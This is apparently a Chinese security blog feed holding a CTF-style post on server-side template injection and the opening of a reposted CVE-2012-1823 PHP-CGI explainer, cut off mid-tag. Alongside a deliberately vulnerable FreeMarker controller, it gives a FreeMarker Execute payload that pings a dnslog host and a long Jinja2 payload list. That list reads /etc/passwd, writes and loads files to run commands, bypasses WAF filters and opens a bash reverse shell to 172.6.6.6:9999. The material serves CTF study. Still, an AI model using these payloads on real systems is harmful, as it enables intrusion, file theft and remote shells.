lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Hello $&#123;name&#125;!&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;&#x2F;css&#x2F;main.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2 class&#x3D;&quot;hello-title&quot;&gt;Hello $&#123;name&#125;!&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;&#x2F;js&#x2F;main.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>后端代码　　——&gt;　　HelloController.java：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">package com.backendvulnerabilities.ssti;</span><br><span class="line"></span><br><span class="line">import freemarker.cache.MultiTemplateLoader;</span><br><span class="line">import freemarker.cache.StringTemplateLoader;</span><br><span class="line">import freemarker.cache.TemplateLoader;</span><br><span class="line">import freemarker.template.Configuration;</span><br><span class="line">import freemarker.template.Template;</span><br><span class="line">import freemarker.template.TemplateException;</span><br><span class="line">import freemarker.template.utility.DateUtil;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.StringWriter;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class HelloController &#123;</span><br><span class="line"></span><br><span class="line">    @Autowired</span><br><span class="line">    private  Configuration con;</span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;&#x2F;&quot;)</span><br><span class="line">    public String index() &#123;</span><br><span class="line">        return &quot;index&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(value &#x3D; &quot;&#x2F;hello&quot;)</span><br><span class="line">    public String hello(@RequestBody Map&lt;String,Object&gt; body, Model model) &#123;</span><br><span class="line">        model.addAttribute(&quot;name&quot;, body.get(&quot;name&quot;));</span><br><span class="line">        return &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(value &#x3D; &quot;&#x2F;freemarker&quot;)</span><br><span class="line">    public void freemarker(@RequestParam(&quot;username&quot;) String username, HttpServletRequest httpserver,HttpServletResponse response) &#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            String data &#x3D; &quot;1ooooooooooooooooooo~&quot;;</span><br><span class="line">            String templateContent &#x3D; &quot;&lt;html&gt;&lt;body&gt;Hello &quot; + username + &quot; $&#123;data&#125;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&quot;;</span><br><span class="line">            String html &#x3D; createHtmlFromString(templateContent,data);</span><br><span class="line">            response.getWriter().println(html);</span><br><span class="line"></span><br><span class="line">            &#125;catch (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private String createHtmlFromString(String templateContent, String data) throws IOException, TemplateException &#123;</span><br><span class="line">        Configuration cfg &#x3D; new Configuration();</span><br><span class="line">        StringTemplateLoader stringLoader &#x3D; new StringTemplateLoader();</span><br><span class="line">        stringLoader.putTemplate(&quot;myTemplate&quot;,templateContent);</span><br><span class="line">        cfg.setTemplateLoader(stringLoader);</span><br><span class="line">        Template template &#x3D; cfg.getTemplate(&quot;myTemplate&quot;,&quot;utf-8&quot;);</span><br><span class="line">        Map root &#x3D; new HashMap();</span><br><span class="line">        root.put(&quot;data&quot;,data);</span><br><span class="line"></span><br><span class="line">        StringWriter writer &#x3D; new StringWriter();</span><br><span class="line">        template.process(root,writer);</span><br><span class="line">        return writer.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(value &#x3D; &quot;&#x2F;template&quot;, method &#x3D;  RequestMethod.POST)</span><br><span class="line">    public String template(@RequestBody Map&lt;String,String&gt; templates) throws IOException &#123;</span><br><span class="line">        StringTemplateLoader stringLoader &#x3D; new StringTemplateLoader();</span><br><span class="line">        for(String templateKey : templates.keySet())&#123;</span><br><span class="line">            stringLoader.putTemplate(templateKey, templates.get(templateKey));</span><br><span class="line">        &#125;</span><br><span class="line">        con.setTemplateLoader(new MultiTemplateLoader(new TemplateLoader[]&#123;stringLoader,</span><br><span class="line">            con.getTemplateLoader()&#125;));</span><br><span class="line">        return &quot;index&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码主要编译给定的模板字符串和数据，生成HTML进行输出</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911153736602-1300404619.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911153736602-1300404619.png" alt="img"></a></p><p>模板注入的前提是在无过滤的情况下，使用模板来解析我们输入的字符，可以通过页面上的变化，来判断我们输入的内容是否被解析，如上图我们输入的内容被成功解析到页面上，并且没有过滤。</p><p>首先需要控制被攻击模板 /template 的内容，也就是要将本来无危害的模板文件实时更改为可攻击的模板内容。使用的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;hello.ftl&quot;: &quot;&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;\&quot;en\&quot;&gt;&lt;head&gt;&lt;meta charset&#x3D;\&quot;UTF-8\&quot;&gt;&lt;#assign ex&#x3D;\&quot;freemarker.template.utility.Execute\&quot;?new()&gt; $&#123; ex(\&quot;ping ilxwh0.dnslog.cn\&quot;) &#125;&lt;title&gt;Hello!&lt;&#x2F;title&gt;&lt;link href&#x3D;\&quot;&#x2F;css&#x2F;main.css\&quot; rel&#x3D;\&quot;stylesheet\&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;h2 class&#x3D;\&quot;hello-title\&quot;&gt;Hello!&lt;&#x2F;h2&gt;&lt;script src&#x3D;\&quot;&#x2F;js&#x2F;main.js\&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&quot;&#125;</span><br></pre></td></tr></table></figure><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911170426315-957198191.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911170426315-957198191.png" alt="img"></a></p><p>关键代码在上图的红框中，接收用户传入的参数，使用keySet()获取key值，遍历相应的模块名字，使用StringTemplateLoader来加载模板内容，并使用putTemplate将key对应的value（也就是payload）写入templateKey中。这样就可以覆盖 hello.ftl 文件的内容，具体如下：</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911171827668-2059326925.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911171827668-2059326925.png" alt="img"></a></p><p>重新更改了加载的模板内容后，然后直接访问受影响的模板文件路径，此时恶意的模板文件内容就会被加载成功了，并执行了系统命令</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911173804255-14835990.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911173804255-14835990.png" alt="img"></a></p><p>dnslog平台也受到了请求</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911173946071-111351701.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911173946071-111351701.png" alt="img"></a></p><h2 id="二、开始运用"><a href="#二、开始运用" class="headerlink" title="二、开始运用"></a>二、开始运用</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2354192/1599480440997-00e10dda-bb44-4fe7-9b87-2a8de03b598d.png"></p><p>这张图可以说是百试百灵了，然后接下来我们继续根据不同的模版和语言特性进行常用payload的使用总结</p><h3 id="Jinja2使用"><a href="#Jinja2使用" class="headerlink" title="Jinja2使用"></a>Jinja2使用</h3><h3 id="1-flask的全局变量"><a href="#1-flask的全局变量" class="headerlink" title="1.flask的全局变量"></a>1.flask的全局变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config 保存着隐私信息</span><br><span class="line">config.from_object(&#39;os&#39;) </span><br><span class="line">request.environ是一个字典，其中包含和服务器环境相关的对象 </span><br></pre></td></tr></table></figure><h3 id="2-python强大的内省特性"><a href="#2-python强大的内省特性" class="headerlink" title="2.python强大的内省特性"></a>2.python强大的内省特性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">总结:</span><br><span class="line">通过某种类型(字符串:&quot;&quot;，list:[]，int：1)开始引出，__class__找到当前类，__mro__或者__base__找到__object__，前边的语句构造都是要找这个。然后利用object找到能利用的类。还有就是&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)&#125;&#125;这种的，能执行，但是不会回显。一般来说，python2的话用file就行，python3则没有这个属性。</span><br></pre></td></tr></table></figure><p>常见的内省函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__builtins__</span><br><span class="line">__import__</span><br><span class="line">__class__返回调用的参数类型。</span><br><span class="line">__base__返回基类</span><br><span class="line">__mro__允许我们在当前Python环境下追溯继承树</span><br><span class="line">__subclasses__()返回子类</span><br><span class="line">builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块</span><br></pre></td></tr></table></figure><p>常见的寻找过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__base__.__subclasses__()</span><br><span class="line"># 返回子类的列表 [,,,...]</span><br><span class="line">#从中随便选一个类,查看它的__init__</span><br><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__base__.__subclasses__()[30].__init__</span><br><span class="line">&lt;slot wrapper &#39;__init__&#39; of &#39;object&#39; objects&gt;</span><br><span class="line"># wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性</span><br><span class="line"></span><br><span class="line">#再换几个子类，很快就能找到一个重载过__init__的类，比如</span><br><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__base__.__subclasses__()[5].__init__</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__base__.__subclasses__()[5].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</span><br><span class="line">#然后用eval执行命令即可</span><br></pre></td></tr></table></figure><p>安全研究员给出的常用的payload</p><p>文件读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#读文件</span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;  </span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br><span class="line">#写文件</span><br><span class="line">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;1&#39;).write(&quot;&quot;) &#125;&#125;</span><br></pre></td></tr></table></figure><p>任意执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;owned.cfg&#39;,&#39;w&#39;).write(&#39;code&#39;)&#125;&#125; </span><br><span class="line">&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;owned.cfg&#39;) &#125;&#125;  </span><br></pre></td></tr></table></figure><p>写入一次</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;owned.cfg&#39;,&#39;w&#39;).write(&#39;from subprocess import check_output\n\nRUNCMD &#x3D; check_output\n&#39;)&#125;&#125;  </span><br><span class="line">&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;owned.cfg&#39;) &#125;&#125;  </span><br><span class="line">&#123;&#123; config[&#39;RUNCMD&#39;](&#39;&#x2F;usr&#x2F;bin&#x2F;id&#39;,shell&#x3D;True) &#125;&#125; </span><br></pre></td></tr></table></figure><p>不回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;eval&#39;](&#39;1+1&#39;)&#125;&#125;      </span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;(这条指令可以注入，但是如果直接进入python2打这个poc，会报错，用下面这个就不会，可能是python启动会加载了某些模块)  </span><br><span class="line">http:&#x2F;&#x2F;39.105.116.195&#x2F;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;(system函数换为popen(&#39;&#39;).read()，需要导入os模块)  </span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;(不需要导入os模块，直接从别的模块调用)</span><br></pre></td></tr></table></figure><p>python3</p><p>文件读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27&#x2F;etc&#x2F;passwd%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>命令执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>脚本使用示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ttp:&#x2F;&#x2F;192.168.228.36&#x2F;?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;ImmutableDictMixin&#39; %&#125;&#123;&#123; c.__hash__.__globals__[&#39;__builtins__&#39;].eval(&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">绕waf</span><br><span class="line">python2：</span><br><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#39;os.system(&quot;ls&quot;)&#39;)</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39;+&#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.6.6.6&#x2F;9999 0&gt;&amp;1&quot;&#39;)</span><br><span class="line"></span><br><span class="line">python3：</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;]</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;__global&#39;+&#39;s__&#39;)[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;)</span><br></pre></td></tr></table></figure><p>参考资料</p><p><strong>国内资料</strong></p><p>Python方面：<a href="https://www.anquanke.com/post/id/188172">SSTI/沙盒逃逸详细总结</a><a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a><br>                                <a href="https://p0sec.net/index.php/archives/120/">Flask/Jinja2模板注入中的一些绕过姿势</a><br>        PHP方面：<a href="https://www.freebuf.com/vuls/83999.html">服务端模板注入攻击 （SSTI）之浅析</a></p><p><strong>国外资料</strong></p><p>这篇总结的比较全面：<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf">Server-Side Template Injection: RCE for the modern webapp</a><br>        Python方面：<a href="https://0day.work/jinja2-template-injection-filter-bypasses/">Jinja2 template injection filter bypasses</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;一-、什么是SSTI&quot;&gt;&lt;a href=&quot;#一-、什么是SSTI&quot; class=&quot;headerlink&quot; title=&quot;一 、什么是SSTI&quot;&gt;&lt;/a&gt;一 、什么是SSTI&lt;/h1&gt;&lt;h2 id=&quot;0x00-模板注入&quot;&gt;&lt;a href=&quot;#0x00-模板注入&quot; class=&quot;headerlink&quot; title=&quot;0x00 模板注入&quot;&gt;&lt;/a&gt;0x00 模板注入&lt;/h2&gt;&lt;p&gt;这是基于现在的MVC成熟的开发模式所导致的，开发者将输入通过V接收，交给C，然后由 C 调用 M 或者其他的 C 进行处理，最后再返回给 V ，这样就最终显示在我们的面前了，那么这里的 V 中就大量的用到了一种叫做&lt;strong&gt;模板&lt;/strong&gt;的技术。&lt;strong&gt;这种模板的技术不是仅存在于Python&lt;/strong&gt;，只要能使用模版进行开发的地方都会有这个问题，SSTI不属于任何一种的问题，沙盒绕过也不是。&lt;/p&gt;
&lt;h2 id=&quot;0x01常见的模板&quot;&gt;&lt;a href=&quot;#0x01常见的模板&quot; class=&quot;headerlink&quot; title=&quot;0x01常见的模板&quot;&gt;&lt;/a&gt;0x01常见的模板&lt;/h2&gt;&lt;p&gt;PHP：Smarty，Twig（经常出题），Blade&lt;/p&gt;
&lt;p&gt;判断&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Twig &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&amp;#123;7*&amp;#39;7&amp;#39;&amp;#125;&amp;#125;  #输出49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Jinja&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&amp;#123;7*&amp;#39;7&amp;#39;&amp;#125;&amp;#125;  #输出7777777&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;Java：JSP，FreeMarker，Velocity&lt;/p&gt;
&lt;p&gt;Python： Jinja2（常用），django，tornado&lt;/p&gt;
&lt;p&gt;tornado render() 中支持传入自定义函数，以及函数的参数，然后在两个大括号中执行&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2012-1823</title>
    <link href="http://example.com/2020/09/13/CVE-2012-1823/"/>
    <id>http://example.com/2020/09/13/CVE-2012-1823/</id>
    <published>2020-09-13T03:15:07.000Z</published>
    <updated>2020-09-13T13:30:36.892Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lt-转载-gt-PHP-CGI远程代码执行漏洞"><a href="#lt-转载-gt-PHP-CGI远程代码执行漏洞" class="headerlink" title="&lt;转载&gt;PHP-CGI远程代码执行漏洞"></a>&lt;转载&gt;PHP-CGI远程代码执行漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>影响的:php &lt; 5.3.12 or php &lt; 5.4.2</p><p>转载链接：</p><ul><li><a href="https://baijiahao.baidu.com/s?id=1637483210158521104&amp;wfr=spider&amp;for=pc1">https://baijiahao.baidu.com/s?id=1637483210158521104&amp;wfr=spider&amp;for=pc1</a></li><li><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></li></ul><h2 id="漏洞解读"><a href="#漏洞解读" class="headerlink" title="漏洞解读"></a>漏洞解读</h2><h3 id="CGi-协议"><a href="#CGi-协议" class="headerlink" title="CGi 协议"></a>CGi 协议</h3><p>CGI是一种网页表单和程序之间通信的一种协议，和HTTP协议一样，用于进行数据交换。可以用任何语言来写一个CGI脚本，这些语言只要能接受输入输出信息，读取环境变量。</p><p>php-cgi也是一个sapi。在远古的时候，web应用的运行方式很简单，web容器接收到http数据包后，拿到用户请求的文件（cgi脚本），并fork出一个子进程（解释器）去执行这个文件，然后拿到执行结果，直接返回给用户，同时这个解释器子进程也就结束了。基于bash、perl等语言的web应用多半都是以这种方式来执行，这种执行方式一般就被称为cgi</p> <a id="more"></a><p>CGI把用户传递过来的数据穿过来的数据转变成key-value的字典。这个字典中不光有用户的数据，还有HTTP协议的参数，方便任何符合CGI协议的程序调用！但是本身不负责通信，通信的话是通过socket，也就是server。<strong>cgi协议用来确定webserver（例如nginx），也就是内容分发服务器传递过来什么数据，什么样格式的数据</strong></p><p><img src="https://i.loli.net/2020/09/13/ifkl61EM342rQ8t.jpg" alt="2fdda3cc7cd98d1021b8843eb2ceb20b7aec9043.jpeg"></p><p>每次启动时，需要经历加载php.ini文件-&gt;初始化执行环境-&gt;处理请求-&gt;返回内容给webserver-&gt;php-cgi进程退出的流程。</p><p><img src="https://i.loli.net/2020/09/13/6H5KUrPxEvW2aAd.jpg" alt="f636afc379310a55337a36e524b449ac832610bf.jpeg"></p><p>这是PHP-fastcgi的原理图，本身上是对cgi的一次升级。fastcgi协议是对cgi协议效率提升的补充，主要是针对每次请求过来时都需要启动一个cgi解释器进程的优化，不再需要cgi解释器进程每次收到webserver请求后都需要重新加载php.ini文件和初始化执行环境。</p><p>HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  &#x2F;* Header *&#x2F;</span><br><span class="line">  unsigned char version; &#x2F;&#x2F; 版本</span><br><span class="line">  unsigned char type; &#x2F;&#x2F; 本次record的类型</span><br><span class="line">  unsigned char requestIdB1; &#x2F;&#x2F; 本次record对应的请求id</span><br><span class="line">  unsigned char requestIdB0;</span><br><span class="line">  unsigned char contentLengthB1; &#x2F;&#x2F; body体的大小</span><br><span class="line">  unsigned char contentLengthB0;</span><br><span class="line">  unsigned char paddingLength; &#x2F;&#x2F; 额外块大小</span><br><span class="line">  unsigned char reserved; </span><br><span class="line"></span><br><span class="line">  &#x2F;* Body *&#x2F;</span><br><span class="line">  unsigned char contentData[contentLength];</span><br><span class="line">  unsigned char paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure><p>头由8个uchar类型的变量组成，每个变量1字节。其中，<code>requestId</code>占两个字节，一个唯一的标志id，以避免多个请求之间的影响；<code>contentLength</code>占两个字节，表示body的大小。</p><p>语言端解析了fastcgi头以后，拿到<code>contentLength</code>，然后再在TCP流里读取大小等于<code>contentLength</code>的数据，这就是body体。</p><p>Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。不需要该Padding的时候，将其长度设置为0即可。</p><p>可见，一个fastcgi record结构最大支持的body大小是<code>2^16</code>，也就是65536字节。</p><p>下面用一张图来解析一下type这个属性</p><p><img 